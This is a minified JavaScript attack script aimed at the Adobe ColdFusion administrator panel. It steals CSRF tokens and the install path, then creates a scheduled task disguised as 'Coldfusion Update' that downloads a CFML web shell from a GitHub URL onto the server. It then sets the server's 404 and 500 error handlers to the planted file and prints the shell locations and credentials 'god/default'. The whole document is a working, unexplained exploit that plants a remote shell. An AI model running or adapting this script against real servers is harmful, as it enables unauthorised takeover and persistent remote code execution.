function getCSRFToken(e){return $.get(e,function(){})}function getFullPath(){return $.get("/CFIDE/administrator/settings/mappings.cfm",function(e){b="/.*/CFIDE&nbsp",u=e.match(b),u=u[0].replace("&nbsp","")})}function postNewTask(e,t,r){var n="csrftoken="+t+"&TaskName="+e+"&Group=default&Start_Date=03%2F30%2F2015&End_Date=&ScheduleType=Once&StartTimeOnce=8%3A44+PM&Interval=Daily&StartTimeDWM=&customInterval_hour=0&customInterval_min=0&customInterval_sec=0&CustomStartTime=&CustomEndTime=&repeatradio=repeatforeverradio&Repeat=&crontime=&Operation=HTTPRequest&ScheduledURL=https%3A%2F%2Fraw.githubusercontent.com%2FhatRiot%2Fclusterd%2Fa748bff7650c2b955fe1bb6a36db340e4ad4a213%2Fsrc%2Flib%2Fcoldfusion%2Ffuze.cfml&Username=&Password=&Request_Time_out=&proxy_server=&http_proxy_port=&proxy_user=&proxy_password=&publish=1&publish_file="+r+"&publish_overwrite=on&eventhandler=&exclude=&onmisfire=&onexception=&oncomplete=&priority=5&retrycount=3&advancedmode=true&adminsubmit=Submit&taskNameOriginal=&groupOriginal=default&modeOriginal=server";return $.ajax({url:"/CFIDE/administrator/scheduler/scheduleedit.cfm",type:"POST",data:n})}function executeTask(e,t){return $.get("/CFIDE/administrator/scheduler/scheduletasks.cfm?runtask="+e+"&group=default&mode=server&csrftoken="+t,function(){})}function setAsTemplate(e,t){var r="csrftoken="+t+"&LimitTime=true&MaxSeconds=60&enablePerAppSettings=1&uuidtoken=1&enablehttpst=1&WsEnable=1&secureJSONPrefix=%2F%2F&outputBufferMax=1024&enableInMemoryFileSystem=1&inMemoryFileSystemLimit=100&inMemoryFileSystemApplicationLimit=20&WatchInterval=120&globalScriptProtect=FORM%2CURL%2CCOOKIE%2CCGI&allowExtraAttributesInAttrColl=1&cFaaSGeneratedFilesExpiryTime=30&ORMSearchIndexDirectory=&CFFORMScriptSrc=%2FCFIDE%2Fscripts%2F&GoogleMapKey=&serverCFC=Server&compileExtForInclude=*&applicationCFCLookup=1&MissingTemplateHandler="+encodeURI(e)+"&SiteWideErrorHandler="+encodeURI(e)+"&postParametersLimit=100&postSizeLimit=20&throttleThreshold=4&throttleMemory=200&adminsubmit=Submit+Changes";return $.ajax({url:"/CFIDE/administrator/settings/server_settings.cfm",type:"POST",data:r})}task_name="Coldfusion%20Update",$.when(getCSRFToken("/CFIDE/administrator/scheduler/scheduletasks.cfm"),getFullPath()).done(function(e,t){var r=e[2].responseText,n="[0-9A-Z]{40}",o=r.match(n)[0];console.log(o);var a=t[2].responseText,i="/.*/CFIDE&nbsp",s=a.match(i),s=s[0].replace("&nbsp","");console.log(o,s);var c=s+"/update_cf.log",l="/CFIDE/update_cf.log";$.when(postNewTask(task_name,o,c)).done(function(){$.when(executeTask(task_name,o)).done(function(){$.when(getCSRFToken("/CFIDE/administrator/settings/server_settings.cfm")).done(function(e){var t=e,r="[0-9A-Z]{40}",n=t.match(r)[0];$.when(setAsTemplate(l,n)).done(function(){console.log("%c Shell can be found at "+document.location.origin+"/404.cfm","background: #D14126; color: white"),console.log("%c Shell can be found at "+document.location.origin+"/500.cfm","background: #D14126; color: white"),console.log("%c Username: god, Password: default","background: #D14126; color: white")})})})})});